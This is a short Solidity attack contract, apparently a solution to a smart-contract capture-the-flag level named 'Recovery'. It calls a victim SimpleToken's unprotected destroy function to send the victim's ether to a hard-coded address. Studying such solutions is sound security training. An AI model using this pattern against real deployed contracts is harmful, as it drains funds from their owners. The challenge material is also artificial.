// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Recovery.sol";

contract RecoveryAttack 
{
    SimpleToken private victimContract;

    constructor (address _victimContractAddress) {
        victimContract = SimpleToken(payable(_victimContractAddress));
    }  

    function attack() public {
        victimContract.destroy(payable(0x513417e1393a08b6E9D882cafE191086F131d7E1));
    }

}